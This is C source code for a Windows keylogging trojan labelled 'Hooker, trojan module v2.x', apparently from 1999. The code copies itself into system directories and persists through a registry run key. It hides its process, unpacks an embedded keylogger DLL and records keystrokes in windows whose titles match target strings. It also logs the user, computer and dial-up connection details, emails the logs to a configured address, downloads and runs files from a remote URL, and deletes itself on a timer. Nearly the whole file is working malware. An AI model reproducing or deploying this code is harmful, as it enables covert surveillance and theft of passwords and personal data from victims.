/********************************************************************/
/*                                                                  */
/*                 Hooker, trojan module v2.x                       */
/*                          ACrazzi, 1999                           */
/*                                                                  */
/********************************************************************/

#include "hooker.h"
#include "logfunc.h"
#include "common.h"
#include "lzw.h"

//------------------processing path in registry-----------------------
HKEY GetRegKey(const char* s,char* r)
{
const char* szRoots[] = {
        "HKEY_CLASSES_ROOT",
        "HKEY_CURRENT_USER",
        "HKEY_LOCAL_MACHINE",
        "HKEY_USERS"};
const HKEY hKeys[] = {
        HKEY_CLASSES_ROOT,
        HKEY_CURRENT_USER,
        HKEY_LOCAL_MACHINE,
        HKEY_USERS};
int i;  
        for (i=0;i<4;i++) 
        if ( !strncmp(s, szRoots[i], strlen(szRoots[i])) ) {
                strcpy(r, s + strlen(szRoots[i]) + 1);
                return hKeys[i];
        };
        return NULL;
};
//-------------------restart program, if neccessary-------------------
void RecurrentStart(void)
{
char *szCmd,sz1[0x100],sz2[0x100];
PROCESS_INFORMATION pi;
STARTUPINFO si;
        szCmd = GetCommandLine();
        sprintf(sz1,"Restart_%X",sti.number);
        if (!strstr(szCmd,sz1)) {
                //make second copy of a process
                memset(&si,0,sizeof(si));
                si.cb = sizeof(si);
                GetModuleFileName(NULL,sz2,sizeof(sz2));
                //create process
                CreateProcess(
                        sz2,       // pointer to name of executable module 
                        sz1,       // pointer to command line string 
                        NULL,      // pointer to process security attributes  
                        NULL,      // pointer to thread security attributes 
                        false,     // handle inheritance flag 
                        0,         // creation flags 
                        NULL,      // pointer to new environment block 
                        NULL,      // pointer to current directory name 
                        &si,       // pointer to STARTUPINFO 
                        &pi        // pointer to PROCESS_INFORMATION 
                );
                ExitProcess( 0 );
        };

};
//----------------------------self-destruct----------------------------
void AutoKill(HINSTANCE h_keylog)
{                               
HKEY hKey,hRoot;
char sz1[0x100];
        EnterCriticalSection(&gcs);
        //kill itself in registry
        hRoot = GetRegKey(sti.reg_path,sz1);
        if (hRoot) {
                RegOpenKeyEx(
                        hKey,             // handle of open key 
                        sz1,              // address of name of subkey to open 
                        0,                // reserved 
                        KEY_ALL_ACCESS,   // security access mask 
                        &hKey             // address of handle of open key 
                ); 
                RegDeleteValue(hKey,sti.reg_desc);
                RegCloseKey(hKey);
        };
        //kill log
        DeleteFile(sti.logname);
        //kill keylog dll
        GetModuleFileName(h_keylog,sz1,sizeof(sz1));
        FreeLibrary(h_keylog);
        DeleteFile(sz1);
        //Adieu!
        ExitProcess( 0 );

};
//----------------------installation in registry----------------------
void RegInstall(void)
{
HKEY hKey,hRoot;
ULONG i,j;
char buf1[0x100],buf2[0x100];   
        
        hRoot = GetRegKey(sti.reg_path,buf1);
        if (!hRoot) hRoot = HKEY_LOCAL_MACHINE;
        if (RegCreateKeyEx(
                hRoot,              // handle of an open key
                buf1,               // address of subkey name
                0,                  // reserved
                "",                 // address of class string
                REG_OPTION_NON_VOLATILE, // special options flag 
                KEY_ALL_ACCESS,      // desired security access 
                NULL,          // address of key security structure  
                &hKey,         // address of buffer for opened handle 
                &i             // address of disposition value buffer  
        ) != ERROR_SUCCESS) return;
        i = sizeof(buf1);
        if (sti.fullname)
                strcpy(buf2,sti.full_exe_name);
        else
                strcpy(buf2,sti.exe_name);
        if ((RegQueryValueEx(
                        hKey,             // handle of key to query
                        sti.reg_desc,     // address of name of value to query
                        NULL,             // reserved 
                        &j,               // address of buffer for value type 
                        (UCHAR*)buf1,     // address of data buffer 
                        &i                // address of data buffer size 
                ) != ERROR_SUCCESS) || 
                (j != REG_SZ) || 
                (strcmp(buf1,buf2)) ) {
                //set own key
                RegSetValueEx(
                        hKey,             // handle of key to set value for 
                        sti.reg_desc,     // address of value to set 
                        0,                // reserved 
                        REG_SZ,           // flag for value type 
                        (UCHAR*)buf2,     // address of value data 
                        strlen(buf2) + 1  // size of value data 
                ); 
        };
        RegCloseKey(hKey);
};

void Install(void)
//-----------------------installation in system-----------------------
// Copy file with its configured new name and restart process
//--------------------------------------------------------------------
{
char buf1[0x100],buf2[0x100];
PROCESS_INFORMATION pi;
STARTUPINFO si;
        //are we started from our own directory
        GetModuleFileName(NULL,buf1,sizeof(buf1));
        CharUpperBuff(buf1,strlen(buf1));   //it's not neccessary...
        if ( strcmp(sti.full_exe_name,buf1) ) { //no, it is not our directory
                //copy itself
                if (CopyFile(buf1,sti.full_exe_name,false) ) {//copied successfully
                        memset(&si,0,sizeof(si));
                        si.cb = sizeof(si);
                        sprintf(buf2,"Restart_%X Kill_%X=%s",sti.number,sti.number,buf1);
                        //recreating process
                        CreateProcess(
                                sti.full_exe_name,// pointer to name of executable module 
                                buf2,      // pointer to command line string 
                                NULL,      // pointer to process security attributes  
                                NULL,      // pointer to thread security attributes 
                                false,     // handle inheritance flag 
                                0,         // creation flags 
                                NULL,      // pointer to new environment block 
                                NULL,      // pointer to current directory name 
                                &si,       // pointer to STARTUPINFO 
                                &pi        // pointer to PROCESS_INFORMATION 
                        );
                };
                ExitProcess( 0 );
        };
};

//--------------------check title of current window-------------------
bool TitleTest(HWND hwnd, char* t)
{
char title[0x200];
UINT i;
        GetWindowText(hwnd,title,sizeof(title));//get text in window's title
        strcpy(t,title);
        if (sti.total_log) return true;//no matter - total log is on
        CharUpperBuff(title,strlen(title));//to upper case
        for(i = 0;i<sti.nsubstr;i++)//search for the substrings
                if (strstr(title,sti.substr[i])) return true;
        return false;
};


//-------------------------check for RAS-connection...----------------
void ConDectecting(void)
{
static HRASCONN hconn;
static int state;
RASCONN rascon;
RASCONNSTATUS rascs;
LPRASENTRY re;
RASPPPIP rasip;
SYSTEMTIME st;
int i,j;
char sz1[0x1000],sz2[0x100];
FILE* fs;
        if (!bRASDLL) return;
        //current connection?
        rascon.dwSize = sizeof(RASCONN);
        j = sizeof(rascon);
        if (RasEnumConnections(
                &rascon,      // buffer to receive connections data
                (LPDWORD) &j, // size in bytes of buffer 
                (LPDWORD) &i  // number of connections written to buffer
        )) return;
        
        if (!i) {//there is no connections
                hconn = NULL;
                return;
        };
        
        //get connection status
        rascs.dwSize = sizeof(rascs);
        i = RasGetConnectStatus(
                rascon.hrasconn, // handle to RAS connection of interest 
                &rascs           // buffer to receive status data 
        );
        
        if ((i) || (rascs.rasconnstate == RASCS_Disconnected)) {
                hconn = NULL;
                return;
        };
        
        if (hconn != rascon.hrasconn) {
                state = rascs.rasconnstate;
                hconn = rascon.hrasconn;
                return;
        };
        
        if ((rascs.rasconnstate == RASCS_Connected) && (state != RASCS_Connected)) {
                state = RASCS_Connected;
                
                //new connection is successfully established
                
                GetLocalTime(&st);
                //name and time of connection
                sprintf(
                        sz1,
                        "\nConnection: \"%s\", %2.2u:%2.2u:%2.2u\n",
                        rascon.szEntryName,
                        st.wHour,
                        st.wMinute,
                        st.wSecond
                );

                i = 0;  //amount of memory for RASENTRY
                RasGetEntryProperties(
                        NULL, // pointer to full path and filename of phone-book file 
                        rascon.szEntryName,// pointer to an entry name 
                        NULL,              // buffer that receives entry information 
                        (LPDWORD)&i,       // size, in bytes, of the lpRasEntry buffer 
                        NULL, // buffer that receives device-specific configuration information
                        NULL  // size, in bytes, of the lpbDeviceInfo buffer 
                );
        
                re = (LPRASENTRY)new BYTE[i];
                re->dwSize = sizeof(RASENTRY);
        
                j = RasGetEntryProperties(
                        NULL, // pointer to full path and filename of phone-book file 
                        rascon.szEntryName, // pointer to an entry name 
                        re,         // buffer that receives entry information 
                        (LPDWORD)&i,// size, in bytes, of the lpRasEntry buffer 
                        NULL, // buffer that receives device-specific configuration information 
                        NULL  // size, in bytes, of the lpbDeviceInfo buffer 
                );
                
                //phone, script
                if (!j) {
                        if (re->dwfOptions & RASEO_UseCountryAndAreaCodes) 
                                sprintf(
                                        sz2,
                                        "\tPN: %u,%s,%s\n",
                                        re->dwCountryCode,
                                        re->szAreaCode,
                                        re->szLocalPhoneNumber
                                ); 
                        else 
                                sprintf(
                                        sz2,
                                        "\tPN: %s\n",
                                        re->szLocalPhoneNumber
                                );
                        strcat(sz1,sz2);
                        if (strcmp(re->szScript,"")) {
                                sprintf(sz2,"\tScript: %s\n",re->szScript);
                                strcat(sz1,sz2);
                                fs = fopen(re->szScript,"rt");
                                if (fs) {
                                        fseek(fs,0,SEEK_END);
                                        i = ftell(fs);                          
                                        j = strlen(sz1);
                                        if (i < ((int)sizeof(sz1) - j - 0x40)) {
                                                fseek(fs,0,SEEK_SET);
                                                i = fread(&sz1[j],1,i,fs);
                                                sz1[j + i] = 0;
                                                strcat(sz1,"\n");
                                        };
                                        fclose(fs);
                                };
                        };
                };
                
                delete re;              
                
                i = sizeof(RASPPPIP);
                rasip.dwSize = i;

                j = RasGetProjectionInfo(
                        rascon.hrasconn, // handle that specifies remote access connection of interest
                        RASP_PppIp, // specifies type of projection information to obtain 
                        &rasip, // points to buffer that receives projection information 
                        (LPDWORD)&i // points to variable that specifies buffer size 
                );
                
                //our ip and ip of our server
                if (!j) {
                        sprintf(
                                sz2,
                                "\tIP: %s\n"
                                "\tServer's IP: %s\n",
                                rasip.szIpAddress,
                                rasip.szServerIpAddress
                        );
                        strcat(sz1,sz2);
                };
                LogAdd(sz1);
        };
};

//----------------------delete previous copy...-----------------------
void DelPrev()
{
CREATETOOL CreateToolhelp32Snapshot;
FIRST32 Process32First;
NEXT32 Process32Next;
HANDLE h_th;
HINSTANCE h_l;
PROCESSENTRY32 pe;
HANDLE hp;
        h_l = LoadLibrary("KERNEL32.DLL");
        if (!h_l) return;
        CreateToolhelp32Snapshot = 
                (CREATETOOL)GetProcAddress(h_l,"CreateToolhelp32Snapshot");
        Process32First = (FIRST32)GetProcAddress(h_l,"Process32First");
        Process32Next = (NEXT32)GetProcAddress(h_l,"Process32Next");
        if ((!Process32Next) || (!Process32First) || (!CreateToolhelp32Snapshot))
                goto exit_proc;
        
        h_th = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
        pe.dwSize = sizeof(pe);
        if (!Process32First(h_th,&pe)) goto exit_proc;
        do {
                CharUpperBuff(pe.szExeFile,strlen(pe.szExeFile));
                if ((!strcmp(sti.full_exe_name,pe.szExeFile)) && (GetCurrentProcessId() != pe.th32ProcessID)) {
                        hp = OpenProcess(PROCESS_TERMINATE,0,pe.th32ProcessID);
                        if (hp)
#ifdef _DEBUG
                        if (!TerminateProcess(hp,0)) ShowMessage("Cannot terminate process");
#else 
                        TerminateProcess(hp,0);
#endif
                };
        } while(Process32Next(h_th,&pe));
exit_proc:
        FreeLibrary(h_l);
};

//-------------callbackfunction for unpacking keylog-dll--------------
FILE* unpack_file;

void Callback(char* data, int len)
{
        fwrite(data,1,len,unpack_file);
};


//-----------------------------WinMain--------------------------------
int WINAPI WinMain(HINSTANCE,HINSTANCE,LPSTR,int)
{       
MSG msg;
char buf1[0x100],buf2[0x200], buf3[0x100], *szKillIt;
HINSTANCE h_ker, h_keylog, h_ras;
SYSTEMTIME systime, killtime, mailtime, exectime;
int h_timer, i, j;
LPREGISTERSERVICEPROCESS lpRegServ;
LPGETDATA GetData;
LPKEYLOGON KeylogOn;
LPKEYLOGOFF KeylogOff;
LPKEYLOGOPT KeylogOpt;
bool IsLog = false, IsMailing = false, IsChange = false;
UINT cFlush = 0, cMail = 0, cAutoKill = 0, cRegInst = 0, cExe = 0, cCon = 0;
HWND h_curwnd, h_oldwnd = NULL;
FILE* h_f;
HRSRC hr;
HGLOBAL hrd;
_AttachedData a_d;
char* sti_buf;
char old_title[MAX_PATH];
int d_s;
                
        //load configuration
        GetModuleFileName(NULL,buf1,sizeof(buf1));
        h_f = fopen(buf1,"rb");
        fseek(h_f,0,SEEK_END);
        d_s = ftell(h_f);
        sti_buf = new char[d_s];
        fseek(h_f,0,SEEK_SET);
        fread(sti_buf,1,d_s,h_f);	// Store bytes of itself(exe) in sti_buf
        for(i=d_s-1;i>=0;i--) {
                sti_buf[i-1] ^= sti_buf[i];
                sti_buf[i-1] += sti_buf[i];
        };
        memcpy(&a_d,&sti_buf[d_s - sizeof(_AttachedData)],sizeof(_AttachedData));
        if (a_d.signature != 0x3104) {
#ifdef _DEBUG
            ShowMessage("No attached data found at end of file.");
#endif
			return -1;
		}
        sti.total_log = a_d.total_log;
        sti.encrypt_log = a_d.encrypt_log;
        sti.send_mail = a_d.send_mail;
        sti.syspass = a_d.syspass;
        sti.autokill = a_d.autokill;
        sti.fullname = a_d.fullname;
        sti.exepath = a_d.exepath;
        sti.ras = a_d.ras;
        sti.loglimit = a_d.loglimit;
        sti.sendafter = a_d.sendafter;
        sti.nsubstr = a_d.n_ss;
        sti.number = a_d.number;
        //load substrings
        for (i=0,j=a_d.ss_ofs;(UINT)i<a_d.n_ss;i++) {
                sti.substr[i] = new char[strlen(&sti_buf[j]) + 1];
                strcpy(sti.substr[i],&sti_buf[j]);
                j += strlen(&sti_buf[j]) + 1;
        };      
        //log-file name
        strcpy(buf1,&sti_buf[a_d.logname_ofs]);
        GetSystemDirectory(sti.logname,sizeof(sti.logname));
        strcat(sti.logname,"\\");
        strcat(sti.logname,buf1);
        //sendmail server's address
        strcpy(sti.host,&sti_buf[a_d.host_ofs]);
        //mailfrom
        strcpy(sti.mailfrom,&sti_buf[a_d.mailfrom_ofs]);
        //mailto
        strcpy(sti.mailto,&sti_buf[a_d.mailto_ofs]);
        //subject
        strcpy(sti.subj,&sti_buf[a_d.subj_ofs]);
        //exe-name
        strcpy(sti.exe_name,&sti_buf[a_d.exe_ofs]);
        //keylog-dll name
        strcpy(sti.dll_name,&sti_buf[a_d.dll_ofs]);
        //full name of exec
        if (sti.exepath == 2) 
                strcpy(sti.full_exe_name,&sti_buf[a_d.exe_ofs]);
        else {  
                if (!sti.exepath)
                        GetWindowsDirectory(sti.full_exe_name,sizeof(sti.full_exe_name));
                else
                        GetSystemDirectory(sti.full_exe_name,sizeof(sti.full_exe_name));
                strcat(sti.full_exe_name,"\\");
                strcat(sti.full_exe_name,&sti_buf[a_d.exe_ofs]);
        };
        CharUpperBuff(sti.full_exe_name,strlen(sti.full_exe_name));
        //description in registry
        strcpy(sti.reg_desc,&sti_buf[a_d.reg_descr_ofs]);
        //path in registry
        strcpy(sti.reg_path,&sti_buf[a_d.reg_path_ofs]);
        //addr of file in web
        strcpy(sti.http,&sti_buf[a_d.http_ofs]);
        //sendmail's port
        sti.port = a_d.port;
        //interval between sendings
        memcpy(&sti.send_i,&a_d.send_i,sizeof(SYSTEMTIME));
        //time of life
        memcpy(&sti.kill_i,&a_d.kill_i,sizeof(SYSTEMTIME));
        delete sti_buf;
        
        DelPrev();

#ifndef _DEBUG

        RecurrentStart();//restart?
        Install();       //copy exe with its new name and restart it

#endif  
        
        //what does we have in commandline?
        sprintf(buf1,"Kill_%X=",sti.number);
        szKillIt = strstr(GetCommandLine(),buf1);
        if (szKillIt) szKillIt += strlen(buf1);
        //hide process...
        h_ker = LoadLibrary("KERNEL32.DLL");
        if (h_ker) {
                lpRegServ = 
                (LPREGISTERSERVICEPROCESS)GetProcAddress(h_ker,"RegisterServiceProcess");

#ifndef _DEBUG
                
                if (lpRegServ) lpRegServ(NULL,1);

#endif

                FreeLibrary(h_ker);
        };  
        //load RASAPI32.DLL if it is present
        h_ras = LoadLibrary("RASAPI32.DLL");
        if (h_ras) {
                RasEnumConnections = (LPRASENUMCCONNECTIONS)GetProcAddress(h_ras,"RasEnumConnectionsA");
                RasGetConnectStatus = (LPRASGETCONNECTSTATUS)GetProcAddress(h_ras,"RasGetConnectStatusA");
                RasGetEntryProperties = (LPRASGETENTRYPROPERTIES)GetProcAddress(h_ras,"RasGetEntryPropertiesA");
                RasGetProjectionInfo = (LPRASGETPROJECTIONINFO)GetProcAddress(h_ras,"RasGetProjectionInfoA");
                bRASDLL = (RasEnumConnections) && (RasGetConnectStatus) &&
                        (RasGetEntryProperties) && (RasGetProjectionInfo);
        } else bRASDLL = false;

        //initialize log
        LogInit();

        //load keylog-dll from System Directory or from
		//internal LZWpacked dll if not found.
        GetSystemDirectory(buf1,sizeof(buf1));
        strcat(buf1,"\\");
        strcat(buf1,sti.dll_name);
        h_keylog = LoadLibrary(buf1);
        if (!h_keylog) {
                hr = FindResource(
                        NULL,                  // resource-module handle 
                        (LPCTSTR)IDR_KDLL,     // pointer to resource name 
                        "KDLL"                 // pointer to resource type 
                );      
                hrd = LoadResource(
                        NULL,        // resource-module handle 
                        hr           // resource handle 
                ); 
                unpack_file = fopen(buf1,"w+b");
                if (!unpack_file) return -1;
                LZWUnpack((char*)hrd,Callback);
                fclose(unpack_file);
                h_keylog = LoadLibrary(sti.dll_name);
        };
        
        //load functions from keylog-dll
        GetData = (LPGETDATA)GetProcAddress(h_keylog,"GetData");
        KeylogOn = (LPKEYLOGON)GetProcAddress(h_keylog,"KeylogOn");
        KeylogOff = (LPKEYLOGOFF)GetProcAddress(h_keylog,"KeylogOff");
        KeylogOpt = (LPKEYLOGOPT)GetProcAddress(h_keylog,"KeylogOpt");

#ifdef _DEBUG
        if (!GetData) {
                ShowMessage("Error load GetData function");
                return -1;
        };
        if (!KeylogOn) {
                ShowMessage("Error load KeyLogOn function");
                return -1;
        };
        if (!KeylogOff) {
                ShowMessage("Error load KeyLogOff function");
                return -1;
        };
        if (!KeylogOpt) {
                ShowMessage("Error load KeyLogOpt function");
                return -1;
        };

#else
        if ((!GetData) || (!KeylogOn) || (!KeylogOff) || (!KeylogOpt))  return -1;
#endif

        //set mode for keylog-dll
        KeylogOpt(a_d.adv_log);

        //init critical section
        InitializeCriticalSection(&gcs);
        //write time of start
        i = sizeof(buf1);
        if (!GetUserName(buf1,(DWORD*)&i)) buf1[0] = 0;
        i = sizeof(buf3);
        if (!GetComputerName(buf3,(DWORD*)&i)) buf3[0] = 0;
        sprintf(buf2,"Computer: \"%s\" User: \"%s\"\n",buf3,buf1);
        GetLocalTime(&systime);
        SysTimePrint(buf3,systime);
        sprintf(buf1,"\nStarted at %s, %s\n",buf3,buf2);
        LogAdd(buf1);
        //when will we die?
        memcpy(&killtime,&sti.inst_d,sizeof(SYSTEMTIME));
        SysTimeSum(killtime,sti.kill_i);
        //time to send log
        memcpy(&mailtime,&sti.send_d,sizeof(mailtime));
        SysTimeSum(mailtime,sti.send_i);
        //clear exectime
        memset(&exectime,0,sizeof(exectime));
        //set timer
        h_timer = SetTimer(NULL,0,1000,NULL);

        while (GetMessage(&msg,NULL,0,0))       //      GetMessage-loop
        switch(msg.message) {
        case WM_TIMER:
                //take data from keylog-buffer
                if (IsLog) {
                        i = GetData(buf1,sizeof(buf1));
                        buf1[i] = 0;
                        if ( (!a_d.emp_log) && (IsChange) && (i) ) {
                                LogAdd(old_title);
                                IsChange = false;
                        };

                        LogAdd(buf1);
                };
                //keybord things
                h_curwnd = GetForegroundWindow();//take current window
                if (h_curwnd != h_oldwnd) {//window changed
                        //turn keylog off
                        if (IsLog) KeylogOff();
                        IsLog = false;
                        if (TitleTest(h_curwnd,buf2)){//is it our window?
                                GetLocalTime(&systime);
                                sprintf(old_title,
                                        "\nTitle: \"%s\", %2.2u:%2.2u:%2.2u\n",
                                        buf2,
                                        systime.wHour,
                                        systime.wMinute,
                                        systime.wSecond
                                );
                                IsChange = true;
                                if (a_d.emp_log) LogAdd(old_title);
                                IsLog = KeylogOn();   //turn keylog on
                        };
                };
                h_oldwnd = h_curwnd;
                //flush log to disk
                if (cFlush > FLUSH_BUFFER_TIME) {
                        LogFlush();
                        cFlush = 0;
                } else cFlush++;
                //send mail
                if (sti.send_mail) {
                        if ((cMail > MAIL_TEST_TIME) && (!IsMailing)) {
                                GetLocalTime(&systime);
                                if ((SysTimeComp(systime,mailtime) >= 0) || 
                                        (sti.logsize > sti.sendafter)) {//sending...
                                        LogEmailing(mailtime,IsMailing);
                                };
                                cMail = 0;
                        } else cMail++;
                };
                //are we in registry, or it is a good time to die? ;)
                if (cRegInst > REG_TEST_TIME) {
                        if (sti.autokill) {
                                GetLocalTime(&systime);
                                if (SysTimeComp(systime,killtime) >= 0) {
                                        AutoKill(h_keylog);
                                };
                        };
                        RegInstall();
                        cRegInst = 0;
                } else cRegInst++;
                //hmm... may be, there is a good warez in inet? :)
                if ((cExe > EXEC_TEST_TIME) && (!IsMailing)) {
                        GetLocalTime(&systime);
                        if (SysTimeComp(systime,exectime) >= 0) {
                                HttpDownloading(exectime,IsMailing);
                        };
                        cExe = 0;
                } else cExe++;
                //kill own exec?
                if (szKillIt) {
                        if (DeleteFile(szKillIt)) szKillIt = NULL;
                };
                //check for connection
                if (cCon > CON_TEST_TIME) {
                        cCon = 0;
                        ConDectecting();
                } else cCon++;
                break;
#ifdef _DEBUG
                default:
                sprintf(buf1,"Unknown Message: %X",msg.message);
                ShowMessage(buf1);
#endif
        };      
        return msg.wParam;
};
